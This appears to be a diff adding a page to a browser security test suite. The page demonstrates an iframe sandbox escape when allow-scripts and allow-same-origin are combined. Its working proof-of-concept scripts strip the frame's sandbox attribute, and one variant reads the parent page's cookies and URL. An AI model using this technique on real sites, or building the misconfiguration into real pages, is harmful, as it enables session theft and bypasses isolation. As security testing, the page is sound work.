@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>UXSS-XB-02: iframe Sandbox allow-scripts + allow-same-origin Escape</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+</head>
+<body class="test-page" style="background:#0d1117;color:#c9d1d9;">
+<div class="container">
+    <a href="../../../index.html" class="btn btn-back">&larr; Back to Suite</a>
+    <h1>iframe Sandbox Escape via allow-scripts + allow-same-origin</h1>
+    <div class="meta">
+        <span>ID: UXSS-XB-02</span>
+        <span>Browsers: All</span>
+        <span>Category: Sandbox Escape / SOP Bypass</span>
+    </div>
+
+    <div class="test-section">
+        <h2>Description</h2>
+        <p>When an iframe has both <code>allow-scripts</code> and <code>allow-same-origin</code>
+        sandbox flags, the content inside can remove its own sandbox attribute via DOM access
+        to the parent, effectively escaping the sandbox entirely. This is a known design issue
+        in the HTML spec but many developers still misconfigure this.</p>
+        <p>This test verifies whether the sandbox escape works and demonstrates its impact.</p>
+    </div>
+
+    <div class="test-section">
+        <h2>Run Test</h2>
+        <button class="btn btn-run" onclick="runTest()">Test Sandbox Escape</button>
+        <button class="btn" onclick="runNavigationEscape()">Variant: Navigation-based escape</button>
+        <div id="output" class="output-box" style="margin-top:10px;"></div>
+    </div>
+</div>
+
+<script src="../../../js/utils.js"></script>
+<script>
+function runTest() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Testing sandbox escape...</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Browser: ' + info.browser + ' ' + info.version + '</div>';
+
+    // Create sandboxed iframe with both allow-scripts and allow-same-origin
+    const frame = document.createElement('iframe');
+    frame.id = 'sandbox-test-frame';
+    frame.sandbox = 'allow-scripts allow-same-origin';
+    frame.srcdoc = '<html><body>' +
+        '<script>' +
+        'var escaped = false;' +
+        'try {' +
+        // Try to remove sandbox from parent
+        '  var myFrame = parent.document.getElementById("sandbox-test-frame");' +
+        '  var originalSandbox = myFrame.sandbox.toString();' +
+        '  myFrame.removeAttribute("sandbox");' +
+        '  escaped = true;' +
+        '  parent.postMessage({' +
+        '    type: "sandbox-escape",' +
+        '    escaped: true,' +
+        '    originalSandbox: originalSandbox,' +
+        '    message: "Sandbox attribute removed! Frame now has full privileges."' +
+        '  }, "*");' +
+        '} catch(e) {' +
+        '  parent.postMessage({' +
+        '    type: "sandbox-escape",' +
+        '    escaped: false,' +
+        '    error: e.message' +
+        '  }, "*");' +
+        '}' +
+        '<\/script></body></html>';
+
+    window.addEventListener('message', function handler(e) {
+        if (e.data && e.data.type === 'sandbox-escape') {
+            if (e.data.escaped) {
+                output.innerHTML += '<div style="color:#f85149;font-weight:bold;">SANDBOX ESCAPED!</div>';
+                output.innerHTML += '<div style="color:#f85149;">Original sandbox: ' + e.data.originalSandbox + '</div>';
+                output.innerHTML += '<div style="color:#f85149;">' + e.data.message + '</div>';
+                reportResult('output', 'Sandbox escape (allow-scripts + allow-same-origin)', true,
+                    'Frame successfully removed its own sandbox attribute');
+            } else {
+                reportResult('output', 'Sandbox escape', false, 'Blocked: ' + e.data.error);
+            }
+            window.removeEventListener('message', handler);
+        }
+    });
+
+    frame.style.width = '400px';
+    frame.style.height = '60px';
+    frame.style.border = '1px solid #30363d';
+    document.body.appendChild(frame);
+}
+
+function runNavigationEscape() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">Testing navigation-based sandbox escape...</div>';
+
+    // Technique: sandboxed iframe navigates top-level window
+    const frame = document.createElement('iframe');
+    frame.id = 'nav-escape-frame';
+    frame.sandbox = 'allow-scripts allow-same-origin allow-top-navigation';
+    frame.srcdoc = '<html><body>' +
+        '<script>' +
+        '// With allow-top-navigation, sandboxed frame can navigate parent' +
+        '// Combined with allow-same-origin, this enables reading parent DOM before navigating' +
+        'try {' +
+        '  var parentData = {' +
+        '    title: parent.document.title,' +
+        '    cookies: parent.document.cookie,' +
+        '    url: parent.location.href' +
+        '  };' +
+        '  parent.postMessage({type:"nav-escape", data: parentData, step: "read"}, "*");' +
+        '} catch(e) {' +
+        '  parent.postMessage({type:"nav-escape", error: e.message, step: "read"}, "*");' +
+        '}' +
+        '<\/script></body></html>';
+
+    window.addEventListener('message', function handler(e) {
+        if (e.data && e.data.type === 'nav-escape') {
+            if (e.data.data) {
+                output.innerHTML += '<div style="color:#f85149;">Sandboxed frame read parent data:</div>';
+                output.innerHTML += '<div style="color:#8b949e;">  Title: ' + e.data.data.title + '</div>';
+                output.innerHTML += '<div style="color:#8b949e;">  URL: ' + e.data.data.url + '</div>';
+                reportResult('output', 'Navigation sandbox escape', true,
+                    'Sandboxed frame with allow-same-origin read parent DOM');
+            } else {
+                reportResult('output', 'Navigation sandbox escape', false, 'Blocked: ' + (e.data.error || 'unknown'));
+            }
+            window.removeEventListener('message', handler);
+        }
+    });
+
+    frame.style.display = 'none';
+    document.body.appendChild(frame);
+}
+</script>
+</body>
+</html>
